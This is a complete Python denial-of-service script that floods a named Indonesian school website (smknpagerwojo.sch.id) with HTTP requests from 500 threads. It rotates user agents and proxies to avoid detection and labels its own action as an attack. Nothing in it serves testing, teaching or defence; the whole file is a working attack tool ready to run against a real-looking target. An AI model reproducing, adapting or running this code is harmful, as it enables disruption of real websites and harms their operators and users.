import requests
import threading
import random
import time

# Target details
target_url = "http://smknpagerwojo.sch.id"  # Replace with your target URL
thread_count = 500  # Number of threads to use
request_interval = 0.1  # Interval (in seconds) between requests per thread

# Load User-Agents from a file
def load_user_agents(file_path):
    try:
        with open(file_path, "r") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"[!] User-Agent file '{file_path}' not found. Using default User-Agent.")
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]

# Load proxies from a file
def load_proxies(file_path):
    try:
        with open(file_path, "r") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"[!] Proxy file '{file_path}' not found. Using no proxy.")
        return []

user_agents = load_user_agents("user_agents.txt")
proxies = load_proxies("proxies.txt")

# Function to send a single HTTP request
def send_request():
    while True:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": "http://google.com",
            }
            proxy = {"http": random.choice(proxies)} if proxies else None
            response = requests.get(target_url, headers=headers, proxies=proxy, timeout=5)
            print(f"[+] Request sent! Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
        time.sleep(request_interval)

# Function to start multiple threads for the attack
def start_attack():
    print(f"Starting attack on {target_url} with {thread_count} threads.")
    for _ in range(thread_count):
        thread = threading.Thread(target=send_request)
        thread.daemon = True
        thread.start()
    while True:
        time.sleep(1)

# Main execution
if __name__ == "__main__":
    start_attack()
